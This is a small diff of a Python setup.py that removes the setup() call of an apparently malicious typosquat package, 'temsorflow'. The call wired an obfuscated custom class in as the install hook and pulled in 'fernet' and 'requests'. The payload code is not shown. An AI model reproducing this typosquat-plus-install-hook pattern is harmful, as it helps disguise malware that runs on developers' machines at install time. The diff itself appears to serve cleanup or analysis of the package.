@@ -18,22 +18,5 @@ class FIayaATlcOwHNkLpjoWaOTrnFLWIuwCrkHPnRfmtMJUDkSRQYezTxsBbpxATFILWcCBGxnZyfv
             install.run(self)
 
 
-setup(
-    name="temsorflow",
-    version=VERSION,
-    author="ECDeZQaEaaXWk",
-    author_email="SjGwUTD@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': FIayaATlcOwHNkLpjoWaOTrnFLWIuwCrkHPnRfmtMJUDkSRQYezTxsBbpxATFILWcCBGxnZyfvaEGaTTdBRTUBkcpeaSXQqPHtKHyosyYBcZSucVxTnffMamDvbYRVxbrnNUAYvvhnKmStbQUYawhGXOsLCFoGYJYiCcrutJPqijummGEhZJWkjnCaFNICjZK,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 
